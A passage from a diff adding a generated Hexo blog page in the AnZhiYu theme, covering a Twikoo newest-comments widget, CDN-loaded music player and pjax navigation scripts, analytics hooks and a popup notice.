+          return {
+            'content': changeContent(e.comment),
+            'avatar': e.avatar,
+            'nick': e.nick,
+            'url': e.url + '#' + e.id,
+            'date': new Date(e.created).toISOString()
+          }
+        })
+
+        saveToLocal.set('twikoo-newest-comments', JSON.stringify(twikooArray), 10/(60*24))
+        generateHtml(twikooArray)
+      }).catch(function (err) {
+        const $dom = document.querySelector('#card-newest-comments .aside-list')
+        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
+      })
+    }
+
+    if (typeof twikoo === 'object') {
+      runTwikoo()
+    } else {
+      getScript('https://cdn.cbd.int/twikoo@1.6.21/dist/twikoo.all.min.js').then(runTwikoo)
+    }
+  }
+
+  const generateHtml = array => {
+    let result = ''
+
+    if (array.length) {
+      for (let i = 0; i < array.length; i++) {
+        result += '<div class=\'aside-list-item\'>'
+
+        if (true) {
+          const name = 'data-lazy-src'
+          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'><div class='name'><span>${array[i].nick} </span></div></a>`
+        }
+        
+        result += `<div class='content'>
+        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
+        <time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
+        </div>`
+      }
+    } else {
+      result += '没有评论'
+    }
+
+    let $dom = document.querySelector('#card-newest-comments .aside-list')
+    $dom.innerHTML= result
+    window.lazyLoadInstance && window.lazyLoadInstance.update()
+    window.pjax && window.pjax.refresh($dom)
+  }
+
+  const newestCommentInit = () => {
+    if (document.querySelector('#card-newest-comments .aside-list')) {
+      const data = saveToLocal.get('twikoo-newest-comments')
+      if (data) {
+        generateHtml(JSON.parse(data))
+      } else {
+        getComment()
+      }
+    }
+  }
+
+  newestCommentInit()
+  document.addEventListener('pjax:complete', newestCommentInit)
+})</script><script>var visitorMail = "visitor@anheyu.com";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><script type="text/javascript" src="/js/fps.js"></script><div id="fps"></div><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["meta[property=\"og:image\"]","meta[property=\"og:title\"]","meta[property=\"og:url\"]","meta[property=\"og:type\"]","meta[property=\"og:site_name\"]","meta[property=\"og:description\"]","head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"]):not([href="/music/"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
